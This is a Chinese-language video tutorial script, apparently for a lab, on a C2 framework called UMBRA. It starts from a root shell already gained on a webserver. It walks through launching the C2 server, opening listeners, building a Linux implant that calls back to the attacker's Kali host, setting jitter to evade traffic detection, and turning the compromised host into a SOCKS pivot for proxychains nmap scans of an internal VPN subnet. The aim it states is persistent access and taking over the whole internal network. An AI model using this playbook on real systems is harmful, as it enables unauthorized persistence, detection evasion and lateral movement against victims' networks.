# UMBRA 实战教程 · 从 webserver 到内网

> 场景驱动：已拿到 webserver 的 root shell，用 UMBRA 把一次性访问变成可持续作战平台
> 实测环境：Kali 2026.2（192.168.1.50）+ webserver（192.168.1.46）
> 建议时长：58–62 分钟（可分上下两集）

---

## 镜头 1 · 开场（00:00 – 01:30）

**画面**：终端里一个 root shell，光标闪烁。然后切到 UMBRA 客户端主界面。

**旁白**：

> 大家好。这期视频从一个真实的场景开始。
>
> 假设你现在已经拿到了这台 webserver 的 root shell —— 就是屏幕上这个。
>
> 很多人到这里就觉得「结束了，我拿到 root 了」。
>
> 但其实，**真正的活儿才刚开始**。
>
> 为什么？我给你三个理由：
>
> **第一，这个 shell 随时会断。** 网络抖动、目标重启、管理员发现异常，任何一件事都能让你前功尽弃。
>
> **第二，你只有一个终端窗口。** 想同时看文件、看进程、抓凭据，只能来回切命令，效率极低。
>
> **第三，你没法横向。** 这台机器只是入口，真正的目标在它后面的内网里。
>
> 这期视频就讲：**怎么用一个 root shell，撬动整个内网**。

**字幕**：
```
场景：已拿到 webserver root shell
问题：如何从「一次性访问」变成「可持续作战」
```

>
> 这就是 UMBRA 要解决的问题。

# 第二幕 · 部署作战平台（05:00 – 12:00）

## 镜头 4 · 启动服务端（05:00 – 07:00）

**画面**：Kali 终端

```bash
cd /home/myroot/umbra
./umbra.py server start
```

**输出**：
```
Loading dependencies ... done
Starting SQLite database ... done
Starting NukeScripts worker ... done
INFO:     Uvicorn running on http://0.0.0.0:9000
```

**旁白**：

> 服务端是整个作战平台的中枢。它负责：
> - 接收植入体回连
> - 存储所有数据（会话、命令历史、凭据、IOC）
> - 给客户端提供 API
>
> 注意监听在 `0.0.0.0:9000` —— 所有网卡，这样植入体从任何网络都能连回来。

**画面**：验证

```bash
ss -ltn | grep 9000
# LISTEN 0 2048 0.0.0.0:9000 0.0.0.0:*

curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:9000/
# 401
```

**旁白**：

> **401 是好事**，不是错误。说明认证中间件在工作 —— 所有请求都要带 JWT token。
>
> 如果返回 200，反而说明认证没生效，是安全问题。

**画面**：开新终端，后台运行方式

```bash
setsid nohup ./umbra.py server start > /tmp/umbra-server.log 2>&1 < /dev/null &
```

**旁白**：

> 日常用建议后台跑，日志重定向到文件。

## 镜头 6 · 连接服务器（09:00 – 12:00）

**画面**：顶栏 UMBRA → 服务器 → 添加

**旁白**：

> 现在连接服务器。顶栏 UMBRA → 服务器 → 添加。

**画面**：填表单

| 字段 | 值 |
|---|---|
| 名称 | `kali-lab` |
| 协议 | `http` |
| 主机 | `127.0.0.1` |
| 端口 | `9000` |
| 密钥 | 粘贴 `admin.key` 整行 |

**旁白**：

> 密钥是三段式：`用户名:密码:密钥`。
>
> 为什么三段？这是**双因素认证**：
> - 用户名：标识身份
> - 密码：验证「你知道什么」，服务端存 bcrypt 哈希
> - 密钥：验证「你持有什么」，128 字符明文
>
> 即使数据库被拖走，攻击者也拿不到明文密码。

**画面**：鼠标移到「认证」按钮，高亮

**旁白**（重点）：

> **这里有个必须注意的点：填完表单要点「认证」，不能直接关闭。**
>
> 因为服务器配置**只有在认证成功后才写入** `config.json`。
>
> 如果你只填表单然后关掉，服务器根本没保存。后面建监听器时，服务器下拉框会是空的，看起来像「点不动」。
>
> 这是新手最容易卡住的地方。

**画面**：点认证，状态灯变绿，提示 `Authenticated`

**画面**：终端验证

```bash
cat ~/.config/umbra/config.json
```

**旁白**：

> 配置文件里有内容了，带一个 JWT token，有效期默认 7 天。
>
> 好处是**无状态** —— 服务端不存会话，重启也不影响已认证的客户端。

# 第三幕 · 建立持久访问（12:00 – 22:00）

## 镜头 7 · 创建监听器（12:00 – 14:00）

**画面**：`Shift+L` 打开监听器面板 → 添加

| 字段 | 值 | 说明 |
|---|---|---|
| 名称 | `http-8080` | 任意 |
| 类型 | `Channel` | 通道类型 |
| 通道 | `http` | 通信协议 |
| 服务器 | `kali-lab` | 下拉选择 |
| Port to Open | `8080` | **实际监听端口** |

**画面**：点创建，终端验证

```bash
ss -ltn | grep 8080
# LISTEN 0 2048 0.0.0.0:8080 0.0.0.0:*
```

**旁白（重点讲绑定地址）**：

> 注意这里绑定的是 **`0.0.0.0:8080`**，不是 `127.0.0.1`。
>
> 这个区别很关键：
> - `0.0.0.0` —— 监听所有网卡，远程目标能连
> - `127.0.0.1` —— 只有本机能连，远程目标永远连不上
>
> 我实测时发现过一个 bug：服务器下拉框选中的 IP 被错误地写进了监听器的绑定地址，导致监听器只绑在 `127.0.0.1`。表面上看「创建成功」，但植入体永远回连不上。
>
> 这个问题已经修复了。但你在用其他工具时也要注意这个区别 —— **「监听成功」和「能被远程访问」是两件事**。

**旁白（讲原理）**：

> 监听器是什么？**它是植入体的「接听电话」端。**
>
> 为什么不直接让服务端监听，要多一层？
>
> 因为**一个服务端可以挂多个监听器**：
>
> ```
> 服务端 :9000
> ├── 监听器 A :8080  (HTTP)   → 能出网的 Linux 目标
> ├── 监听器 B :8443  (HTTPS)  → 有流量检测的环境
> ├── 监听器 C :445   (SMB)    → 纯内网横向
> └── 监听器 D :1080  (TCP)    → 直连场景
> ```
>
> 不同网络环境用不同通道。这是 C2 框架灵活性的核心。

## 镜头 8 · 生成植入体（14:00 – 18:00）

**画面**：`Shift+I` 打开植入体面板 → 选 Stageless

**旁白**：

> 两种模式：
> - **Stageless** —— 所有功能打包成一个文件，一次执行完。简单可靠，但文件大。
> - **Loader** —— 分两阶段，第一阶段是小体积下载器。隐蔽，但需要额外分发通道。
>
> 我们目标是 Linux，用 Stageless 最稳。

**画面**：填配置

**常规**：

| 字段 | 值 |
|---|---|
| 编译服务器 | `127.0.0.1:9000` |
| 操作系统 | `Linux` |
| 架构 | `x64` |
| 格式 | `elf` |

**C2（关键）**：

| 字段 | 值 | 说明 |
|---|---|---|
| 通道 | `http` | 和监听器一致 |
| **Server 地址** | **`192.168.1.50:8080`** | **Kali 的桥接 IP** |
| 延迟 | `5` | 心跳间隔（秒） |
| 抖动 | `20` | 随机化百分比 |

**旁白（重点）**：

> **这里最容易出错！** Server 地址必须填**目标机能访问到的地址**。
>
> 我的 Kali 是桥接模式，IP `192.168.1.50`，和目标机 `192.168.1.46` 同网段，所以直接填 Kali 的 IP 就行。
>
> 如果 Kali 是 NAT 模式（IP 像 `10.0.2.15`），就要填宿主机 IP 并配端口转发 —— 因为 NAT 私有地址目标机根本路由不到。
>
> **判断标准只有一条：从目标机能不能访问到这个地址？**
>
> 验证方法：在目标机执行 `curl http://192.168.1.50:8080`，能连上就对了。

**旁白（讲延迟与抖动）**：

> **延迟和抖动是干什么的？**
>
> 这是**规避流量检测**的关键。
>
> 如果植入体每 5 秒精确回连一次，流量分析一眼就能看出异常 —— 人类不会这么规律。
>
> 加上 20% 抖动，间隔变成 4–6 秒随机：
> ```
> 实际间隔 = delay × (1 ± jitter/100)
> ```
>
> 看起来更像正常用户行为。

**画面**：点 Build，下载 ELF

**旁白**：

> 构建成功，下载下来是一个 ELF 文件，约 670 KB。

**旁白**：

**画面**：执行植入体

```bash
./implant &
```

**旁白**：

> 植入体会主动回连 `192.168.1.50:8080`。
>
> 服务端收到后写入数据库，客户端就能看到了。

**画面**：客户端 `Alt+S` 打开会话列表

**旁白**：

> 会话上线了。
>

**画面**：排错流程字幕

```
会话不上线？按顺序查：
① 目标能 curl 通 C2 地址吗？  → 不通 = 网络问题
② Kali 上 8080 在监听吗？     → ss -ltn | grep 8080
③ 监听器绑的是 0.0.0.0 吗？  → 不是就重新创建
④ 植入体在跑吗？              → ps aux | grep implant
⑤ 防火墙拦了吗？              → iptables -L
⑥ 看服务端日志                → tail -f /tmp/umbra-server.log
```

## 镜头 17 · SOCKS 代理（38:00 – 42:00）★重点

**画面**：`Shift+N` 打开网络面板

**旁白**：

> 这是**内网渗透的核心技术**。
>
> 现在我们有了一台内网机器的 root，而且它连着 VPN，能看到 `10.8.0.0/24` 网段。
>
> 但我们的 Kali 直接访问不到那个网段。怎么办？
>
> **把 webserver 变成代理跳板。**

**画面**：添加 SOCKS 代理

| 字段 | 值 |
|---|---|
| 类型 | `socks` |
| 监听端口 | `1080` |
| 目标主机 | `192.168.1.46` |

**画面**：启动，验证

```bash
ss -ltn | grep 1080
# LISTEN 0 2048 127.0.0.1:1080 0.0.0.0:*
```

**旁白**：

> 代理起来了。现在测试能不能访问内网。

**画面**：用 curl 通过代理访问内网

```bash
curl --socks5 127.0.0.1:1080 http://10.8.0.1/
```

**旁白**：

> 如果通了，说明代理链路成功。
>
> 现在 Kali 可以通过 webserver 访问整个 `10.8.0.0/24` 网段了。

**画面**：浏览器配置代理

```
代理类型：SOCKS5
地址：127.0.0.1
端口：1080
```

**旁白**：

> 浏览器配上代理，就能直接访问内网的 Web 服务了。
>
> 这就是「以点破面」—— 攻破一台，拿下整个内网。

**画面**：扫描内网

```bash
proxychains nmap -sT -Pn 10.8.0.0/24
```

**旁白**：

> 通过代理扫内网，发现存活主机。
>
> 注意要用 `-sT`（TCP connect 扫描），因为 SOCKS 代理不支持原始套接字。
